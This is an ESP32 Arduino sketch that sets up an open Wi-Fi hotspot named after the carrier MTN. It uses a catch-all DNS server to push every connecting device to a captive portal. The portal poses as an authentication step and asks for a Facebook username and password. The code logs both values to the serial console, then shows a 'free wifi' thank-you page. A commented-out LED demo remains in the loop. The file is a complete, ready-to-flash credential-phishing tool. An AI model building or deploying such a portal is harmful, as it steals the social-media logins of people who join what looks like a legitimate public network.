#include <WiFi.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <DNSServer.h>

#include <HTTPClient.h>
#include <NetworkClientSecure.h>
#include <NetworkClient.h>

#define CLIENT_LED 5
#define ACTIVE_LED 2

const byte DNS_PORT = 53;
const char* ssid     = "MTN-wifi";

const char* htmlPage = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ESP32 Captive Portal</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f3f4f6;
    }
    .container {
      width: 90%;
      max-width: 400px;
      padding: 20px;
      background-color: #ffffff;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      text-align: center;
    }
    h2 {
      color: #333;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      margin: 10px 0 5px;
      text-align: left;
      color: #666;
      font-size: 14px;
    }
    input[type="text"],
    input[type="password"] {
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
    }
    input[type="submit"] {
      padding: 12px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Authentication required</h2>
    <form action="/submit" method="POST">
      <label for="username">Facebook Username</label>
      <input type="text" id="username" name="username" placeholder="Enter username" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter password" required>

      <input type="submit" value="Connect">
    </form>
  </div>
</body>
</html>
)=====";

const char *thankYouPage = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Thank You</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f3f4f6;
    }
    .container {
      width: 90%;
      max-width: 400px;
      padding: 20px;
      background-color: #ffffff;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      text-align: center;
    }
    h2 {
      color: #333;
      margin-bottom: 10px;
    }
    p {
      color: #666;
      font-size: 16px;
    }
    a {
      display: inline-block;
      margin-top: 20px;
      padding: 10px 20px;
      color: white;
      background-color: #4CAF50;
      text-decoration: none;
      border-radius: 4px;
      transition: background-color 0.3s;
    }
    a:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Thank You for connecting!</h2>
    <p>Enjoy the free wifi.</p>
    <a href="/">Go Back to Home</a>
  </div>
</body>
</html>
)=====";

WebServer server(80);
DNSServer dnsserver;


void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("Configuring wifi access point.....");

  pinMode(CLIENT_LED, OUTPUT);
  pinMode(ACTIVE_LED, OUTPUT);


  if(!WiFi.softAP(ssid))
  {
    log_e("Soft AP creation failed.");
    while(1);
  }

  dnsserver.start(DNS_PORT, "*", WiFi.softAPIP());

  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
  server.on("/", handleRoot);
  server.on("/submit", handleSubmit);
  server.onNotFound(handleRoot);
  server.begin();

  Serial.println("Server started!");
}

void loop() {

  digitalWrite(ACTIVE_LED, HIGH);
  dnsserver.processNextRequest();
  server.handleClient();
  //NetworkClient client = server.accept();
  //digitalWrite(CLIENT_LED, LOW);

/*
  if (client)
  {
    Serial.println("New client.");
    String currentline = "";
    digitalWrite(CLIENT_LED, HIGH);

    while(client.connected())
    {
      if (client.available())
      {
        char c = client.read();
        Serial.write(c);
        if(c=='\n')
        {
          if(currentline.length()==0)
          {
            client.println("HTTP/1.1 200 OK");
            client.println("content-type:text/html");
            client.println();

            client.print("Click <a href=\"/H\">here</a> to turn ON the LED.<br>");
            client.print("Click <a href=\"/L\">here</a> to turn OFF the LED.<br>");

            client.println();

            break;
          } else {
            currentline = "";
          }
        }
        else if(c!='\r')
        {
          currentline += c;
        }

        if(currentline.endsWith("Get /H"))
        {
          digitalWrite(CLIENT_LED, HIGH);
        }
        if(currentline.endsWith("Get /L"))
        {
          digitalWrite(CLIENT_LED, LOW);
        }
      }
    }

    client.stop();
    Serial.println("Client disconnected.");
  }*/
}

void handleRoot() {
  server.send(200, "text/html", htmlPage);
}

void handleSubmit()
{
  String username = server.arg("username");
  String password = server.arg("password");

  Serial.println("Facebook id: "+ username);
  Serial.println("Password: "+ password);

  server.send(200, "text/html", thankYouPage);
}